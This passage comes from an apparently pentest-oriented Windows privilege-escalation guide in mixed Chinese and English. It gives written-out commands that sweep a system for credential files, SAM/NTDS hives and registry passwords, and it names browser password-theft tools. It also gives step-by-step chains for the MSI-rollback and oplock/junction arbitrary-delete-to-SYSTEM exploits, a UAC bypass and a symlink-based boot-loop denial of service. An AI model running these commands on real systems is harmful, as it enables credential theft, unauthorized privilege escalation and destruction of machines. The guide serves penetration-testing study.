cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭据

你还应该检查 Bin，看看里面是否有凭据

要**恢复密码**，一些程序保存的密码可以使用：[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 在注册表中

**其他可能包含凭据的注册表项**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**从 registry 中提取 openssh keys。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器 History

你应该检查存储 **Chrome 或 Firefox** 密码的 dbs。\
同时检查浏览器的 history、bookmarks 和 favourites，因为那里也可能存有一些 **passwords**。

从浏览器中提取密码的工具：

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** 是 Windows 操作系统内置的一种技术，允许不同语言的软件组件之间进行 **intercommunication**。每个 COM component 都通过一个 **class ID (CLSID)** 来标识，每个 component 都通过一个或多个 interfaces 暴露功能，这些 interfaces 由 interface IDs (IIDs) 标识。

COM classes 和 interfaces 分别在 registry 中定义于 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface**。这个 registry 通过合并 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

在这个 registry 的 CLSIDs 里面，你可以找到子 registry **InProcServer32**，其中包含一个指向 **DLL** 的 **default value**，以及一个名为 **ThreadingModel** 的 value，它可以是 **Apartment**（Single-Threaded）、**Free**（Multi-Threaded）、**Both**（Single or Multi）或 **Neutral**（Thread Neutral）。

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

基本上，如果你能够 **overwrite any of the DLLs** 并且这些 DLL 会被执行，那么如果该 DLL 将由不同用户执行，你就可以 **escalate privileges**。

要了解攻击者如何将 COM Hijacking 用作 persistence 机制，请查看：


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**在注册表中搜索键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索密码的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 自动搜索本页提到的所有包含密码的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个很棒的工具，用于从系统中提取密码。

工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 搜索会话、用户名以及多个工具保存的明文密码（PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP）
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

想象一个 **作为 SYSTEM 运行的进程打开了一个新进程** (`OpenProcess()`) 且拥有 **full access**。同一个进程 **还创建了另一个新进程** (`CreateProcess()`) ，**权限较低，但继承了主进程的所有 open handles**。\
然后，如果你拥有这个低权限进程的 **full access**，你就可以抓取通过 `OpenProcess()` 创建的那个指向特权进程的 **open handle**，并 **注入 shellcode**。\
[阅读这个示例以了解更多关于 **如何检测和利用此漏洞**。](leaked-handle-exploitation.md)\
[阅读这篇 **另一篇文章，获取更完整的说明，了解如何测试和滥用进程和线程中继承的更多 open handlers 及不同权限级别（不只是 full access）**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。

## Named Pipe Client Impersonation

共享内存段，称为 **pipes**，用于进程通信和数据传输。

Windows 提供了一项名为 **Named Pipes** 的功能，允许无关的进程共享数据，甚至跨不同网络。这类似于 client/server 架构，其中角色定义为 **named pipe server** 和 **named pipe client**。

当一个 **client** 通过 pipe 发送数据时，设置该 pipe 的 **server** 可以 **采用** 该 **client** 的 **identity**，前提是它拥有必要的 **SeImpersonate** 权限。识别一个通过你可以仿冒的 pipe 通信的 **privileged process**，就提供了一个机会：在该进程与你建立的 pipe 交互后，通过采用其 identity 来 **获取更高权限**。关于执行此类攻击的说明，可在 [**here**](named-pipe-client-impersonation.md) 和 [**here**](#from-high-integrity-to-system) 找到有用指南。

另外，以下工具允许使用类似 burp 的工具 **拦截 named pipe 通信**： [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **，并且这个工具允许列出并查看所有 pipes 以寻找 privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) 的 server mode 暴露 `\\pipe\\tapsrv` (MS-TRP)。远程经过身份验证的 client 可以滥用基于 mailslot 的 async event 路径，把 `ClientAttach` 变成对任何现有且可被 `NETWORK SERVICE` 写入的文件的任意 **4-byte write**，然后获得 Telephony admin 权限，并以该 service 加载任意 DLL。完整流程：

- `ClientAttach`，将 `pszDomainUser` 设为一个可写的现有路径 → service 通过 `CreateFileW(..., OPEN_EXISTING)` 打开它，并将其用于 async event writes。
- 每个 event 都会把攻击者控制的 `InitContext`（来自 `Initialize`）写入那个 handle。使用 `LRegisterRequestRecipient` (`Req_Func 61`) 注册一个 line app，触发 `TRequestMakeCall` (`Req_Func 121`)，通过 `GetAsyncEvents` (`Req_Func 0`) 获取，然后注销/关闭以重复进行确定性的 writes。
- 将自己加入 `C:\Windows\TAPI\tsec.ini` 中的 `[TapiAdministrators]`，重新连接，然后调用 `GetUIDllName` 并指定任意 DLL path，以 `NETWORK SERVICE` 身份执行 `TSPI_providerUIIdentify`。

更多细节：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

查看页面 **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

可点击的 Markdown links 被转发到 `ShellExecuteExW` 时，可能触发危险的 URI handlers（`file:`、`ms-appinstaller:` 或任何已注册的 scheme），并以当前用户身份执行攻击者控制的文件。参见：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

当以用户身份获得 shell 时，可能会有 scheduled tasks 或其他进程正在执行，它们会在 command line 中 **传递 credentials**。下面的脚本每两秒捕获一次 process command lines，并将当前状态与前一状态比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从进程中窃取密码

## 从 Low Priv User 到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过 console 或 RDP），并且 UAC 已启用，那么在某些版本的 Microsoft Windows 中，可以以非特权用户运行 terminal 或任何其他进程，例如 "NT\AUTHORITY SYSTEM"。

这使得可以同时利用同一个漏洞进行权限提升和绕过 UAC。此外，无需安装任何东西，并且在该过程中使用的 binary 由 Microsoft 签名并发布。

受影响的系统包括：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用这个漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## 从 Administrator Medium 到 High Integrity Level / UAC Bypass

阅读此内容以**了解 Integrity Levels**：


{{#ref}}
integrity-levels.md
{{#endref}}

然后**阅读此内容以了解 UAC 和 UAC bypasses：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 从 Arbitrary Folder Delete/Move/Rename 到 SYSTEM EoP

该技术在[**这篇博客文章**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)中有描述，并且有一个 [**可用的 exploit code 在这里**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

这个攻击的基本思路是滥用 Windows Installer 的 rollback 功能，在卸载过程中用恶意文件替换合法文件。为此，攻击者需要创建一个 **malicious MSI installer**，它将被用来 hijack `C:\Config.Msi` 文件夹，而 Windows Installer 之后会在卸载其他 MSI packages 时把 rollback 文件存放到那里；这些 rollback 文件会被修改为包含恶意 payload。

总结后的技术如下：

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- 创建一个 `.msi`，在可写文件夹（`TARGETDIR`）中安装一个无害文件（例如 `dummy.txt`）。
- 将安装程序标记为 **"UAC Compliant"**，这样 **non-admin user** 就可以运行它。
- 安装完成后保持该文件的一个 **handle** 打开。

- Step 2: Begin Uninstall
- 卸载同一个 `.msi`。
- 卸载过程开始将文件移动到 `C:\Config.Msi`，并将它们重命名为 `.rbf` 文件（rollback backups）。
- 使用 `GetFinalPathNameByHandle` **轮询**这个打开的文件句柄，以检测文件何时变成 `C:\Config.Msi\<random>.rbf`。

- Step 3: Custom Syncing
- 该 `.msi` 包含一个 **custom uninstall action (`SyncOnRbfWritten`)**，它会：
- 在 `.rbf` 写入完成时发出信号。
- 然后在继续卸载前**等待**另一个事件。

- Step 4: Block Deletion of `.rbf`
- 当收到信号后，**打开 `.rbf` 文件**，且不使用 `FILE_SHARE_DELETE`——这会**阻止它被删除**。
- 然后**回传信号**，以便卸载可以完成。
- Windows Installer 无法删除 `.rbf`，而且因为它无法删除全部内容，**`C:\Config.Msi` 不会被移除**。

- Step 5: Manually Delete `.rbf`
- 你（攻击者）手动删除 `.rbf` 文件。
- 现在 **`C:\Config.Msi` 是空的**，可以被 hijack。

> 此时，**触发 SYSTEM-level arbitrary folder delete vulnerability** 来删除 `C:\Config.Msi`。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 你自己重新创建 `C:\Config.Msi` 文件夹。
- 设置 **weak DACLs**（例如，Everyone:F），并用 `WRITE_DAC` **保持一个句柄打开**。

- Step 7: Run Another Install
- 再次安装 `.msi`，并设置：
- `TARGETDIR`: 可写位置。
- `ERROROUT`: 一个触发强制失败的变量。
- 这次安装将用于再次触发 **rollback**，读取 `.rbs` 和 `.rbf`。

- Step 8: Monitor for `.rbs`
- 使用 `ReadDirectoryChangesW` 监控 `C:\Config.Msi`，直到出现新的 `.rbs`。
- 捕获它的文件名。

- Step 9: Sync Before Rollback
- 该 `.msi` 包含一个 **custom install action (`SyncBeforeRollback`)**，它会：
- 在 `.rbs` 创建时发出信号。
- 然后在继续前**等待**。

- Step 10: Reapply Weak ACL
- 在收到 `.rbs created` 事件后：
- Windows Installer 会对 `C:\Config.Msi` **重新应用强 ACLs**。
- 但由于你仍然持有一个带 `WRITE_DAC` 的句柄，你可以**再次重新应用 weak ACLs**。

> ACLs 只在句柄打开时生效，所以你仍然可以向该文件夹写入。

- Step 11: Drop Fake `.rbs` and `.rbf`
- 用一个**fake rollback script** 覆盖 `.rbs` 文件，该脚本告诉 Windows：
- 将你的 `.rbf` 文件（malicious DLL）恢复到一个**privileged location**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
- 放下你的 fake `.rbf`，其中包含一个**malicious SYSTEM-level payload DLL**。

- Step 12: Trigger the Rollback
- 发出 sync event 让安装程序继续。
- 配置了一个 **type 19 custom action (`ErrorOut`)** 来在已知位置**故意使安装失败**。
- 这会导致 **rollback** 开始。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer：
- 读取你的恶意 `.rbs`。
- 将你的 `.rbf` DLL 复制到目标位置。
- 现在你已经把**恶意 DLL 放到了 SYSTEM-loaded path** 中。

- Final Step: Execute SYSTEM Code
- 运行一个受信任的 **auto-elevated binary**（例如 `osk.exe`），它会加载你 hijacked 的 DLL。
- **Boom**：你的代码以 **SYSTEM** 身份执行。


### 从 Arbitrary File Delete/Move/Rename 到 SYSTEM EoP

主要的 MSI rollback 技术（前一种）假设你可以删除一个**整个文件夹**（例如 `C:\Config.Msi`）。但如果你的漏洞只允许 **arbitrary file deletion** 呢？

你可以利用 **NTFS internals**：每个文件夹都有一个隐藏的 alternate data stream，叫做：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
这个流存储该文件夹的 **索引元数据**。

因此，如果你**删除文件夹的 `::$INDEX_ALLOCATION` 流**，NTFS 会**将整个文件夹**从文件系统中移除。

你可以使用标准的文件删除 API 来执行此操作，例如：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你调用的是一个 *file* delete API，它实际上**删除的是文件夹本身**。

### 从删除 Folder Contents 到 SYSTEM EoP
如果你的 primitive 不允许你删除任意文件/folder，但它**允许删除攻击者可控 folder 的 *contents***，该怎么办？

1. Step 1: 设置一个诱饵 folder 和 file
- 创建: `C:\temp\folder1`
- 在其中: `C:\temp\folder1\file1.txt`

2. Step 2: 在 `file1.txt` 上放置一个 **oplock**
- 当特权进程尝试删除 `file1.txt` 时，oplock 会**暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: Trigger SYSTEM process (e.g., `SilentCleanup`)
- 这个进程会扫描文件夹（例如，`%TEMP%`）并尝试删除其中的内容。
- 当它到达 `file1.txt` 时，**oplock 触发**并将控制权交给你的回调。

4. Step 4: Inside the oplock callback – redirect the deletion

- Option A: 将 `file1.txt` 移动到别处
- 这样会清空 `folder1`，同时不会破坏 oplock。
- 不要直接删除 `file1.txt` —— 那样会过早释放 oplock。

- Option B: 将 `folder1` 转换为一个 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: 在 `\RPC Control` 中创建一个 **symlink**：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这会针对存储文件夹元数据的 NTFS internal stream——删除它就会删除该文件夹。

5. Step 5: Release the oplock
- SYSTEM process 继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际上正在删除：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**：`C:\Config.Msi` 被 SYSTEM 删除。

### 从任意文件夹创建到永久 DoS

利用一个原语，让你能够以 **SYSTEM/admin** 身份 **创建任意文件夹** —— 即使 **你不能写入文件** 或 **设置弱权限**。

创建一个 **文件夹**（不是文件），名称为某个 **关键 Windows 驱动程序**，例如：
```
C:\Windows\System32\cng.sys
```
- 这个路径通常对应 `cng.sys` kernel-mode driver。
- 如果你先把它**预先创建成一个文件夹**，Windows 在启动时就无法加载实际的 driver。
- 然后，Windows 会在启动过程中尝试加载 `cng.sys`。
- 它会看到这个文件夹，**无法解析出实际的 driver**，并且**崩溃或卡在启动阶段**。
- 这里**没有回退机制**，也**没有恢复手段**，除非借助外部干预（例如 boot repair 或磁盘访问）。

### 从特权日志/备份路径 + OM symlinks 到任意文件覆盖 / boot DoS

当一个**特权服务**把日志/导出内容写到一个从**可写配置**读取的路径时，可以用 **Object Manager symlinks + NTFS mount points** 把这个特权写入重定向为任意覆盖（即使**没有** SeCreateSymbolicLinkPrivilege）。

**Requirements**
- 存储目标路径的 config 可被攻击者写入（例如 `%ProgramData%\...\.ini`）。
- 能够创建指向 `\RPC Control` 的 mount point 和一个 OM file symlink（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- 存在一个会向该路径写入内容的特权操作（log、export、report）。

**Example chain**
1. 读取 config 以恢复特权日志目的地，例如 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`，位于 `C:\ProgramData\ICONICS\IcoSetup64.ini` 中。
2. 无需 admin 重定向该路径：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 等待特权组件写入日志（例如，admin 触发 “send test SMS”）。这次写入现在落到 `C:\Windows\System32\cng.sys`。
4. 检查被覆盖的目标（hex/PE parser）以确认损坏；重启会迫使 Windows 加载被篡改的 driver path → **boot loop DoS**。这也可推广到任何受保护、特权服务会以写入方式打开的文件。

> `cng.sys` 通常从 `C:\Windows\System32\drivers\cng.sys` 加载，但如果在 `C:\Windows\System32\cng.sys` 中存在一个副本，可能会先尝试它，因此它是一个对损坏数据很可靠的 DoS sink。



## **From High Integrity to System**

### **New service**

如果你已经在一个 High Integrity 进程中运行，**到 SYSTEM 的路径**可能很简单，只需**创建并执行一个新 service**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
